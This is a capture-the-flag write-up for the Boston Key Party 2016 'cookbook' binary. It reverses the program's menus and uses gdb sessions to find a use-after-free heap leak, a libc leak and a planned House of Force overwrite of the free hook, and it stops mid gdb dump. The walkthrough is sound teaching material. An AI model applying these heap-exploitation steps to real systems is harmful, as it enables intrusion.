# Boston Key Party 2016 Cookbook

This exploit is based off of this writeup with multiple parts (one of the best writeups I ever saw):
https://www.youtube.com/watch?v=f1wp6wza8ZI
https://www.youtube.com/watch?v=dnHuZLySS6g
https://www.youtube.com/watch?v=PISoSH8KGVI

Let's take a look at the binary and libc file:

```
$    file cookbook
cookbook: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=2397d3d3c3b98131022ddd98f30e702bd4b88230, stripped
$    pwn checksec cookbook
[*] '/Hackery/pod/modules/house_of_power/bkp16_cookbook/cookbook'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
$ ./libc-2.24.so
GNU C Library (Ubuntu GLIBC 2.24-9ubuntu2.2) stable release version 2.24, by Roland McGrath et al.
Copyright (C) 2016 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 6.3.0 20170406.
Available extensions:
  crypt add-on version 2.1 by Michael Glad and others
  GNU Libidn by Simon Josefsson
  Native POSIX Threads Library by Ulrich Drepper et al
  BIND-8.2.3-T5B
libc ABIs: UNIQUE IFUNC
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
$    ./cookbook
what's your name?
guyinatuxedo
+-----------------------------+
|          .--,--.            |
|          `.  ,.'            |
|           |___|             |
|           :o o:             |
|          _`~^~'             |
|        /'   ^   `\          |
| cooking manager pro v6.1... |
+-----------------------------+
====================
[l]ist ingredients
[r]ecipe book
[a]dd ingredient
[c]reate recipe
[e]xterminate ingredient
[d]elete recipe
[g]ive your cookbook a name!
[R]emove cookbook name
[q]uit
```

So we can see that we are given a `32` bit binary, we a Stack Canary and NX. We can also see that we are dealing with the libc version `2.24`.

## Reversing

This is going to be a fun one. Checking the references to strings that we see in the menu, we find the `menu` function:

```
void menu(void)

{
  char *ptr;
  size_t sVar1;
  int in_GS_OFFSET;
  char input [10];
  int canary;
 
  canary = *(int *)(in_GS_OFFSET + 0x14);
  puts("====================");
  puts("[l]ist ingredients");
  puts("[r]ecipe book");
  puts("[a]dd ingredient");
  puts("[c]reate recipe");
  puts("[e]xterminate ingredient");
  puts("[d]elete recipe");
  puts("[g]ive your cookbook a name!");
  puts("[R]emove cookbook name");
  puts("[q]uit");
  fgets(input,10,stdin);
  switch(input[0]) {
  case 'R':
    removeName();
    break;
  default:
    puts("UNKNOWN DIRECTIVE");
    break;
  case 'a':
    addIngredient();
    break;
  case 'c':
    createRecipe();
    break;
  case 'e':
    ptr = (char *)calloc(0x80,1);
    printf("which ingredient to exterminate? ");
    fgets(ptr,0x80,stdin);
    sVar1 = strcspn(ptr,"\n");
    ptr[sVar1] = '\0';
    FUN_080497f9(ptr);
    free(ptr);
    break;
  case 'g':
    nameCookbook();
    break;
  case 'l':
    listIngredients();
    break;
  case 'q':
    puts("goodbye, thanks for cooking with us!");
    if (canary != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    return;
  case 'r':
    recipeCookbook();
  }
}
```

Let's start going through this code and the functions it calls bit by bit:

```
void listIngredients(void)

{
  undefined4 *currentIngredient;
 
  currentIngredient = ingredients;
  while (currentIngredient != (undefined4 *)0x0) {
    puts("------");
    printIngredient(*currentIngredient);
    currentIngredient = (undefined4 *)currentIngredient[1];
    if (currentIngredient == (undefined4 *)0x0) {
      puts("------");
    }
  }
  return;
}
```

We can see here that iterate through and print all of our ingredients using the `printIngredient` function. We can also see that our ingredients are stored in the bss variable `ingredients` stored at `0x804d094`. We can see the structure of an ingredient thanks to the `printIngredient` function:

```

void printIngredient(undefined4 *param_1)

{
  printf("name: %s\n",param_1 + 2);
  printf("calories: %zd\n",*param_1);
  printf("price: %zd\n",param_1[1]);
  return;
}
```

So we can see here, that an ingredient is `12` bytes long. The first `4` bytes holds the calories, the second `4` bytes holds the prices, and the third `4` bytes holds the name. Next up we have:

```
void recipeCookbook(void)

{
  uint recipeCount;
  undefined4 currentRecipe;
  uint i;
 
  recipeCount = countDwordValues(&recipes);
  printf("%s\'s cookbook",cookbookName);
  i = 0;
  while (i < recipeCount) {
    currentRecipe = grabRecipe(&recipes,i);
    printRecipe(currentRecipe);
    i = i + 1;
  }
  return;
}
```

Like the `listIngredients` function, this prints the recipes, which are stored in the bss variable `recipes` at `0x804d08c`. Also we can see it prints the name of the cookbook, which is stored in the bss address `cookbookName` at `0x804d0ac`. Looking at the `printRecipe` function, we see what the structure of a recipe looks like:

```
void printRecipe(undefined4 *ingredient)

{
  uint ingredientCount;
  int iVar1;
  undefined4 cals;
  int in_GS_OFFSET;
  undefined4 ingredients;
  undefined4 ingredientQuantities;
  uint i;
  int canary;
  int canaryVal;
 
  canaryVal = *(int *)(in_GS_OFFSET + 0x14);
  ingredients = *ingredient;
  ingredientQuantities = ingredient[1];
  ingredientCount = countDwordValues(&ingredients);
  printf("[---%s---]\n",ingredient + 2);
  printf("recipe type: %s\n",ingredient[0x1f]);
  puts((char *)(ingredient + 0x23));
  i = 0;
  while (i < ingredientCount) {
    cals = grabRecipe(&ingredientQuantities,i);
    iVar1 = grabRecipe(&ingredients,i);
    printf("%zd - %s\n",cals,iVar1 + 8);
    i = i + 1;
  }
  cals = getCost(ingredient);
  printf("total cost : $%zu\n",cals);
  cals = getCals(ingredient);
  printf("total cals : %zu\n",cals);
  if (canaryVal != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

From that (and some of the functions this called) we can tell that the structure of a recipe is this:

```
0x0:  ptr to linked list of ingredient counts
0x4:  ptr to linked list of ingredient quantities
0x8:  char array for recipe name
124:  char array to recipe type
140:  Char array for recipe instruction
```

Next up is `nameCookbook`:

```
void nameCookbook(void)

{
  ulong size;
  int in_GS_OFFSET;
  char inputLen [64];
  int canary;
  int canaryVal;
 
  canaryVal = *(int *)(in_GS_OFFSET + 0x14);
  printf("how long is the name of your cookbook? (hex because you\'re both a chef and a hacker!) : "
        );
  fgets(inputLen,0x40,stdin);
  size = strtoul(inputLen,(char **)0x0,0x10);
  name = (char *)malloc(size);
  fgets(name,size,stdin);
  printf("the new name of the cookbook is %s\n",name);
  if (canaryVal != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

We can see that the name of the cookbook is stored in a heap chunk, where a pointer to that chunk is stored in the bss variable `name` at `0x804d0a8`. We have control over the size of the chunk. Checking the references to `name` we see this function.

```
void removeName(void)

{
  free(name);
  return;
}
```

Here we can see it frees the pointer stored at `name`, which we can run with the `R` option. Also notice how there are no checks on the pointer before it is freed, and it isn't zeroed out (so we might have a UAF here). Next up, we have the `e` option:

```
  case 'e':
    ptr = (char *)calloc(0x80,1);
    printf("which ingredient to exterminate? ");
    fgets(ptr,0x80,stdin);
    sVar1 = strcspn(ptr,"\n");
    ptr[sVar1] = '\0';
    FUN_080497f9(ptr);
    free(ptr);
```  

We can see that it allocates `0x80` bytes worth of heap space, scans in that much data into the space, then frees it. Next up we have:

```
void addIngredient(void)

{
  size_t sVar1;
  char *nameWrite;
  char *priceWrite;
  char *caloriesWrite;
  int iVar2;
  int in_GS_OFFSET;
  char local_1a [10];
  int canary;
 
  canary = *(int *)(in_GS_OFFSET + 0x14);
  puts("====================");
  puts("[l]ist current stats?");
  puts("[n]ew ingredient?");
  puts("[c]ontinue editing ingredient?");
  puts("[d]iscard current ingredient?");
  puts("[g]ive name to ingredient?");
  puts("[p]rice ingredient?");
  puts("[s]et calories?");
  puts("[q]uit (doesn\'t save)?");
  puts("[e]xport saving changes (doesn\'t quit)?");
  fgets(local_1a,10,stdin);
  sVar1 = strcspn(local_1a,"\n");
  local_1a[sVar1] = '\0';
  switch(local_1a[0]) {
  case 'c':
    puts("still editing this guy");
    break;
  case 'd':
    free(currentIngredient);
    currentIngredient = (int *)0x0;
    break;
  case 'e':
    if (currentIngredient == (int *)0x0) {
      puts("can\'t do it on a null guy");
    }
    else {
      iVar2 = FUN_08049c58(currentIngredient + 2);
      if ((iVar2 == -1) && (*(char *)(currentIngredient + 2) != '\0')) {
        appendIngredient(&ingredients,currentIngredient);
        currentIngredient = (int *)0x0;
        puts("saved!");
      }
      else {
        puts("can\'t save because this is bad.");
      }
    }
    break;
  default:
    puts("UNKNOWN DIRECTIVE");
    break;
  case 'g':
    nameWrite = (char *)calloc(0x80,1);
    if (currentIngredient == (int *)0x0) {
      puts("can\'t do it on a null guy");
    }
    else {
      fgets(nameWrite,0x80,stdin);
      sVar1 = strcspn(nameWrite,"\n");
      nameWrite[sVar1] = '\0';
      memcpy(currentIngredient + 2,nameWrite,0x80);
    }
    free(nameWrite);
    break;
  case 'l':
    if (currentIngredient == (int *)0x0) {
      puts("can\'t print NULL!");
    }
    else {
      printIngredient(currentIngredient);
    }
    break;
  case 'n':
    currentIngredient = (int *)malloc(0x90);
    *(int **)(currentIngredient + 0x23) = currentIngredient;
    break;
  case 'p':
    priceWrite = (char *)calloc(0x80,1);
    if (currentIngredient == (int *)0x0) {
      puts("can\'t do it on a null guy");
    }
    else {
      fgets(priceWrite,0x80,stdin);
      sVar1 = strcspn(priceWrite,"\n");
      priceWrite[sVar1] = '\0';
      iVar2 = atoi(priceWrite);
      currentIngredient[1] = iVar2;
    }
    free(priceWrite);
    break;
  case 'q':
    if (canary != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    return;
  case 's':
    caloriesWrite = (char *)calloc(0x80,1);
    if (currentIngredient == (int *)0x0) {
      puts("can\'t do it on a null guy");
    }
    else {
      fgets(caloriesWrite,0x80,stdin);
      sVar1 = strcspn(caloriesWrite,"\n");
      caloriesWrite[sVar1] = '\0';
      iVar2 = atoi(caloriesWrite);
      *currentIngredient = iVar2;
    }
    free(caloriesWrite);
  }
}
```

After reversing all of this, we have what each of the secondary menu options do:

```
currentIngredient = current ingredient being edited, global variable stored in bss at 0x804d09c
l - prints ingredient options
n - mallocs 0x90 bytes of space, sets currentIngredient equal to the pointer returned by malloc, then sets that address + 0x8c equal to the pointer returned by malloc
c - prints out a string
d - frees currentIngredient, sets currentIngredient equal to zero
g - callocs 0x80 bytes of space, if currentIngredient is set it will scan 128 bytes into the calloced space, removes the trailing newline then write that as the currentIngredient name
p - callocs 0x80 bytes of space, if currentIngredient is set it will scan 128 bytes into the calloced space, removes the trailing newline and converts it to an integer, then write the output of that as currentIngredient price
s - callos 0x80 bytes of space, if currentIngredient is set it will scan 128 bytes into the calloced space, removes the trailing newline and converts it to an integer, then write the output of that as currentIngredient calories
q - exits the function
e - if currentIngredient is set, it will append the pointer currentIngredient to the end of the linked list ingredients
```

The `c` option also presents us with another menu:

```
void createRecipe(void)

{
  int iVar1;
  size_t sVar2;
  int ingredientPtr;
  ulong uVar3;
  int iVar4;
  int iVar5;
  int in_GS_OFFSET;
  int local_d0;
  int *local_cc;
  char local_aa [10];
  char input0 [144];
 
  iVar1 = *(int *)(in_GS_OFFSET + 0x14);
LAB_080490a6:
  puts("[n]ew recipe");
  puts("[d]iscard recipe");
  puts("[a]dd ingredient");
  puts("[r]emove ingredient");
  puts("[g]ive recipe a name");
  puts("[i]nclude instructions");
  puts("[s]ave recipe");
  puts("[p]rint current recipe");
  puts("[q]uit");
  fgets(local_aa,10,stdin);
  sVar2 = strcspn(local_aa,"\n");
  local_aa[sVar2] = '\0';
  switch(local_aa[0]) {
  case 'a':
    if (currentRecipe == (int **)0x0) {
      puts("can\'t do it on a null guy");
    }
    printf("which ingredient to add? ");
    fgets(input0,0x90,stdin);
    sVar2 = strcspn(input0,"\n");
    input0[sVar2] = '\0';
    ingredientPtr = grabIngredientPtr(input0);
    if (ingredientPtr == 0) {
      printf("I dont know about, %s!, please add it to the ingredient list!\n",input0);
    }
    else {
      printf("how many? (hex): ");
      fgets(input0,0x90,stdin);
      sVar2 = strcspn(input0,"\n");
      input0[sVar2] = '\0';
      uVar3 = strtoul(input0,(char **)0x0,0x10);
      appendIngredient(currentRecipe,ingredientPtr);
      appendIngredient(currentRecipe + 1,uVar3);
      puts("nice");
    }
    break;
  default:
    puts("UNKNOWN DIRECTIVE");
    break;
  case 'd':
    free(currentRecipe);
    break;
  case 'g':
    if (currentRecipe == (int **)0x0) {
      puts("can\'t do it on a null guy");
    }
    else {
      fgets((char *)(currentRecipe + 0x23),0x40c,stdin);
    }
    break;
  case 'i':
    if (currentRecipe == (int **)0x0) {
      puts("can\'t do it on a null guy");
    }
    else {
      fgets((char *)(currentRecipe + 0x23),0x40c,stdin);
      sVar2 = strcspn(local_aa,"\n");
      local_aa[sVar2] = '\0';
    }
    break;
  case 'n':
    currentRecipe = (int **)calloc(1,0x40c);
    break;
  case 'p':
    if (currentRecipe != (int **)0x0) {
      printRecipe(currentRecipe);
    }
    break;
  case 'q':
    if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    return;
  case 'r':
    if (currentRecipe == (int **)0x0) {
      puts("can\'t do it on a null guy");
    }
    else {
      printf("which ingredient to remove? ");
      fgets(input0,0x90,stdin);
      local_d0 = 0;
      local_cc = *currentRecipe;
      while (local_cc != (int *)0x0) {
        iVar5 = *local_cc;
        iVar4 = strcmp((char *)(iVar5 + 8),input0);
        if (iVar4 == 0) {
          FUN_080487b5(currentRecipe,local_d0);
          FUN_080487b5(currentRecipe + 1,local_d0);
          printf("deleted %s from the recipe!\n",iVar5 + 8);
          goto LAB_080490a6;
        }
        local_d0 = local_d0 + 1;
        local_cc = (int *)local_cc[1];
      }
    }
    break;
  case 's':
    if (currentRecipe == (int **)0x0) {
      puts("can\'t do it on a null guy");
    }
    else {
      iVar5 = FUN_08049cb8(currentRecipe + 2);
      if ((iVar5 == -1) && (*(char *)(currentRecipe + 2) != '\0')) {
        *(undefined **)(currentRecipe + 0x1f) = PTR_s_drink_0804d064;
        appendIngredient(&recipes,currentRecipe);
        currentRecipe = (int **)0x0;
        puts("saved!");
      }
      else {
        puts("can\'t save because this is bad.");
      }
    }
  }
}
```

After reversing it, we find out that the menu options do this:

```
currentRecipe = current recipe being edited, stored as a global variable in the bss at 0x804d0a0
n - callocs 0x40c bytes worth of space, set's currentRecipe equal to the pointer returned by calloc
d - frees currentRecipe
a - checks if currentRecipe is zero, and if it is prints an error message (function does continue), scans  0x90 bytes worth of data in input0, checks to see if that corresponds to any ingredient name and if so returns a ptr to it, if a ptr is returned then it will scan in 0x90 bytes which is converted to an unsigned long integer from hex string. Proceeding that the ingredient name is added to currentRecipe, with the quantity from the output of the hex string conversion.
r - Scans in 0x90 bytes worth of data into input0
g - if currentRecipe is set, it will scan in 0x40c bytes into the instructions for currentRecipe (not the name)
i - if currentRecipe is set, it will scan in 0x40c bytes into the instructions for currentRecipe
s - First checks to see if currentRecipe is set, then performs a secondary check to see if the name has been set (we don't have a method of directly setting it, so this presents a problem). After that it adds currentRecipe to recipeCollection, then sets currentRecipe equal to zero.
p - if currentRecipe is set, it will print the current setting for currentRecipe by running it through print_recipe
q - exits the function
```

The `q` option just exits the menu. We can also see that the option `d` doesn't actually have a case for it set, so it will just print out `UNKOWN DIRECTIVE` (as well any other input that has not been mentioned).

## Exploitation

For this, our exploit will really have two stages. The first will involve getting a Heap and Libc infoleak. The second part will involve writing the libc address of `system` to the free hook, using a House of Force Attack.

#### Heap Infoleak

So in order to execute this house of force attack against the free hook, the first infoleak we will need will be one from the heap. First off we have a use after free bug in the `createRecipe` menu (option c). We see that in there, if we delete an item (option d) it frees the space but the pointer remains:

```
      case 'd':
        free(cur_rec);
        continue;
```

Let's see how what this space looks like in gdb after it is freed:

```
gef➤  b *0x80495a0
Breakpoint 1 at 0x80495a0
gef➤  r
Starting program: /Hackery/pod/modules/house_of_force/bkp16_cookbook/cookbook
what's your name?
guyinatuxedo
+-----------------------------+
|          .--,--.            |
|          `.  ,.'            |
|           |___|             |
|           :o o:             |
|          _`~^~'             |
|        /'   ^   `\          |
| cooking manager pro v6.1... |
+-----------------------------+
====================
[l]ist ingredients
[r]ecipe book
[a]dd ingredient
[c]reate recipe
[e]xterminate ingredient
[d]elete recipe
[g]ive your cookbook a name!
[R]emove cookbook name
[q]uit
c
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
n
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
a
which ingredient to add? water
how many? (hex): 0x1
nice
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
p

Breakpoint 1, 0x080495a0 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0804f2b0  →  0x0804f6c0  →  0x0804e050  →  0x00000000
$ebx   : 0xffffcff0  →  0x00000001
$ecx   : 0x1       
$edx   : 0xffffce62  →  0x00000070 ("p"?)
$esp   : 0xffffce20  →  0x0804f2b0  →  0x0804f6c0  →  0x0804e050  →  0x00000000
$ebp   : 0xffffcf08  →  0xffffcfc8  →  0xffffcfd8  →  0x00000000
$esi   : 0xf7fb6000  →  0x001b1db0
$edi   : 0xf7fb6000  →  0x001b1db0
$eip   : 0x080495a0  →   call 0x80495d6
$eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffce20│+0x0000: 0x0804f2b0  →  0x0804f6c0  →  0x0804e050  →  0x00000000  ← $esp
0xffffce24│+0x0004: 0x0804a5ea  →   or al, BYTE PTR [eax]
0xffffce28│+0x0008: 0xf7fb65a0  →  0xfbad208b
0xffffce2c│+0x000c: 0xf7fb6d60  →  0xfbad2887
0xffffce30│+0x0010: 0xf7e6efa7  →  <__uflow+7> add ebx, 0x147059
0xffffce34│+0x0014: 0xf7fb65e8  →  0xf7fb787c  →  0x00000000
0xffffce38│+0x0018: 0x00000000
0xffffce3c│+0x001c: 0xf7e63291  →  <_IO_getline_info+161> add esp, 0x10
──────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8049597                  mov    eax, ds:0x804d0a0
    0x804959c                  sub    esp, 0xc
    0x804959f                  push   eax
 →  0x80495a0                  call   0x80495d6
   ↳   0x80495d6                  push   ebp
       0x80495d7                  mov    ebp, esp
       0x80495d9                  sub    esp, 0x38
       0x80495dc                  mov    eax, DWORD PTR [ebp+0x8]
       0x80495df                  mov    DWORD PTR [ebp-0x2c], eax
       0x80495e2                  mov    eax, gs:0x14
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
0x80495d6 (
   [sp + 0x0] = 0x0804f2b0 → 0x0804f6c0 → 0x0804e050 → 0x00000000,
   [sp + 0x4] = 0x0804a5ea →  or al, BYTE PTR [eax]
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "cookbook", stopped, reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x80495a0 → call 0x80495d6
[#1] 0x8048a67 → jmp 0x8048b42
[#2] 0x804a426 → call 0x8049bed
[#3] 0xf7e1c637 → __libc_start_main()
[#4] 0x8048621 → hlt
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/3wx 0x0804f2b0
0x804f2b0:  0x0804f6c0  0x0804f6d0  0x00000000
gef➤  x/4w 0x0804f6c0
0x804f6c0:  0x0804e050  0x00000000  0x00000000  0x00000011
gef➤  x/3w 0x0804e050
0x804e050:  0x00000000  0x00000006  0x65746177
gef➤  x/s 0x0804e058
0x804e058:  "water"
```

So here we can see is the memory for our recipe (starting at `0x0804f2b0`). We can see that the pointers to the linked list for the ingredients (stored at `0x0804f6c0`), and the array of our ingredient counts. Also we can see our `water` ingredient at `0x804e050`. Let's see what the memory for the `currentRecipe` looks like after we free it:

```
gef➤  c
Continuing.
[------]
recipe type: (null)

1 - water
total cost : $6
total cals : 0
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
d
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
p

Breakpoint 1, 0x080495a0 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0804f2b0  →  0xf7fb67b0  →  0x0804f6d8  →  0x00000000
$ebx   : 0xffffcff0  →  0x00000001
$ecx   : 0x1       
$edx   : 0xffffce62  →  0x00000070 ("p"?)
$esp   : 0xffffce20  →  0x0804f2b0  →  0xf7fb67b0  →  0x0804f6d8  →  0x00000000
$ebp   : 0xffffcf08  →  0xffffcfc8  →  0xffffcfd8  →  0x00000000
$esi   : 0xf7fb6000  →  0x001b1db0
$edi   : 0xf7fb6000  →  0x001b1db0
$eip   : 0x080495a0  →   call 0x80495d6
$eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffce20│+0x0000: 0x0804f2b0  →  0xf7fb67b0  →  0x0804f6d8  →  0x00000000  ← $esp
0xffffce24│+0x0004: 0x0804a5ea  →   or al, BYTE PTR [eax]
0xffffce28│+0x0008: 0xf7fb65a0  →  0xfbad208b
0xffffce2c│+0x000c: 0xf7fb6d60  →  0xfbad2887
0xffffce30│+0x0010: 0xf7e6efa7  →  <__uflow+7> add ebx, 0x147059
0xffffce34│+0x0014: 0xf7fb65e8  →  0xf7fb787c  →  0x00000000
0xffffce38│+0x0018: 0x00000000
0xffffce3c│+0x001c: 0xf7e63291  →  <_IO_getline_info+161> add esp, 0x10
──────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8049597                  mov    eax, ds:0x804d0a0
    0x804959c                  sub    esp, 0xc
    0x804959f                  push   eax
 →  0x80495a0                  call   0x80495d6
   ↳   0x80495d6                  push   ebp
       0x80495d7                  mov    ebp, esp
       0x80495d9                  sub    esp, 0x38
       0x80495dc                  mov    eax, DWORD PTR [ebp+0x8]
       0x80495df                  mov    DWORD PTR [ebp-0x2c], eax
       0x80495e2                  mov    eax, gs:0x14
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
0x80495d6 (
   [sp + 0x0] = 0x0804f2b0 → 0xf7fb67b0 → 0x0804f6d8 → 0x00000000,
   [sp + 0x4] = 0x0804a5ea →  or al, BYTE PTR [eax]
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "cookbook", stopped, reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x80495a0 → call 0x80495d6
[#1] 0x8048a67 → jmp 0x8048b42
[#2] 0x804a426 → call 0x8049bed
[#3] 0xf7e1c637 → __libc_start_main()
[#4] 0x8048621 → hlt
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/3wx 0x0804f2b0
0x804f2b0:  0xf7fb67b0  0xf7fb67b0  0x00000000
gef➤  x/w 0xf7fb67b0
0xf7fb67b0: 0x0804f6d8
gef➤  heap bins
[+] No Tcache in this version of libc
─────────────────────────────────── Fastbins for arena 0xf7fb6780 ───────────────────────────────────
Fastbins[idx=0, size=0x8] 0x00
Fastbins[idx=1, size=0x10] 0x00
Fastbins[idx=2, size=0x18] 0x00
Fastbins[idx=3, size=0x20] 0x00
Fastbins[idx=4, size=0x28] 0x00
Fastbins[idx=5, size=0x30] 0x00
Fastbins[idx=6, size=0x38] 0x00
─────────────────────────────── Unsorted Bin for arena '*0xf7fb6780' ───────────────────────────────
[+] unsorted_bins[0]: fw=0x804f2a8, bk=0x804f2a8
 →   Chunk(addr=0x804f2b0, size=0x410, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
──────────────────────────────── Small Bins for arena '*0xf7fb6780' ────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
──────────────────────────────── Large Bins for arena '*0xf7fb6780' ────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  c
Continuing.
[------]
recipe type: (null)

134543064 -
total cost : $331063448
total cals : 0
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
```

So we can see that the data has been replaced with heap metadata, which is a heap pointer `0x804f6d8`. Because of its positioning, it is where it expects the ingredients to be it ends up printing out the value being pointed to `0x804f6d8` in base ten (134543064). With this we have a heap address which we can use to bypass ASLR in the heap.

#### Libc Infoleak

The next infoleak we will need will be a libc infoleak. Next up, let's see what happens when we allocate space to a recipe, free it, then make a new ingredient. Let's see exactly how the data is layed out when this happens:

```
gef➤  r
Starting program: /Hackery/pod/modules/house_of_force/bkp16_cookbook/cookbook
what's your name?
guyinatuxedo
+-----------------------------+
|          .--,--.            |
|          `.  ,.'            |
|           |___|             |
|           :o o:             |
|          _`~^~'             |
|        /'   ^   `\          |
| cooking manager pro v6.1... |
+-----------------------------+
====================
[l]ist ingredients
[r]ecipe book
[a]dd ingredient
[c]reate recipe
[e]xterminate ingredient
[d]elete recipe
[g]ive your cookbook a name!
[R]emove cookbook name
[q]uit
c
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
n
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
a
which ingredient to add? water
how many? (hex): 0x1
nice
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
i
15935728
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
^C
Program received signal SIGINT, Interrupt.
0xf7fd7fe9 in __kernel_vsyscall ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xfffffe00
$ebx   : 0x0       
$ecx   : 0xf7fb65e7  →  0xfb787c0a
$edx   : 0x1       
$esp   : 0xffffccc8  →  0xffffcd18  →  0x00000009
$ebp   : 0xffffcd18  →  0x00000009
$esi   : 0xf7fb65a0  →  0xfbad208b
$edi   : 0xf7fb6d60  →  0xfbad2887
$eip   : 0xf7fd7fe9  →  <__kernel_vsyscall+9> pop ebp
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffccc8│+0x0000: 0xffffcd18  →  0x00000009  ← $esp
0xffffcccc│+0x0004: 0x00000001
0xffffccd0│+0x0008: 0xf7fb65e7  →  0xfb787c0a
0xffffccd4│+0x000c: 0xf7ed9b23  →  <read+35> pop ebx
0xffffccd8│+0x0010: 0xf7fb6000  →  0x001b1db0
0xffffccdc│+0x0014: 0xf7e6e267  →  <_IO_file_underflow+295> add esp, 0x10
0xffffcce0│+0x0018: 0x00000000
0xffffcce4│+0x001c: 0xf7fb65e7  →  0xfb787c0a
──────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0xf7fd7fe3 <__kernel_vsyscall+3> mov    ebp, ecx
   0xf7fd7fe5 <__kernel_vsyscall+5> syscall
   0xf7fd7fe7 <__kernel_vsyscall+7> int    0x80
 → 0xf7fd7fe9 <__kernel_vsyscall+9> pop    ebp
   0xf7fd7fea <__kernel_vsyscall+10> pop    edx
   0xf7fd7feb <__kernel_vsyscall+11> pop    ecx
   0xf7fd7fec <__kernel_vsyscall+12> ret    
   0xf7fd7fed                  nop    
   0xf7fd7fee                  nop    
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "cookbook", stopped, reason: SIGINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0xf7fd7fe9 → __kernel_vsyscall()
[#1] 0xf7ed9b23 → read()
[#2] 0xf7e6e267 → _IO_file_underflow()
[#3] 0xf7e6f237 → _IO_default_uflow()
[#4] 0xf7e6f02c → __uflow()
[#5] 0xf7e63291 → _IO_getline_info()
[#6] 0xf7e633ce → _IO_getline()
[#7] 0xf7e621ed → fgets()
[#8] 0x8049159 → add esp, 0x10
[#9] 0x8048a67 → jmp 0x8048b42
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/wx 0x804d0a0
0x804d0a0:  0x0804f2b0
gef➤  x/40w 0x804f2b0
0x804f2b0:  0x0804f6c0  0x0804f6d0  0x00000000  0x00000000
0x804f2c0:  0x00000000  0x00000000  0x00000000  0x00000000
